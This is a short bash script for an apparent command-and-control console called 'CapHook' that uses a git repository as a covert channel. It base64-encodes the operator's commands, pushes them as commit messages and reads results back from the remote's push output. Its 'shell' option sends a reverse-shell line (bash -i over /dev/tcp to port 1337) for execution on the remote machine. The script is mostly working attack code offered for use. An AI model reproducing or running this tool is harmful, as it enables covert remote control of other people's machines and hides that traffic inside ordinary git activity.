#!/bin/bash
	    # write a fuddcntion 

execute () {
	encode=$(echo $1 | base64)
	echo ${encode}
    	touch $(cat /dev/urandom | env LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
	git add . > /dev/null
    	git commit -m ${encode} > /dev/null
    	#This is the best I could come up with
    	# I think I figured it out
    	git push &> /tmp/git
    	grep "remote: " /tmp/git | awk '{$1="";print}'
}

while true; do
    echo "CapHook> "
    read command
    if [ $command = "clear" ]
    then
    	clear
    elif [ $command = "shell" ]
	then
	    # gather ip(for unix)
	    # doesn't work
	    addr=$(ip -o -4 -br a | grep "UP" | awk '{print $3}' | sed 's/.\{3\}$//')
	    echo "spawing a shell on port 1337"
	    echo "Make sure you are listening..."
	    cmd="bash -i >& /dev/tcp/$addr/1337 0>&1 &"
	    execute $cmd
    elif [ $command = "exit" ]
	then
	   exit
    else
	execute $command
     fi
done
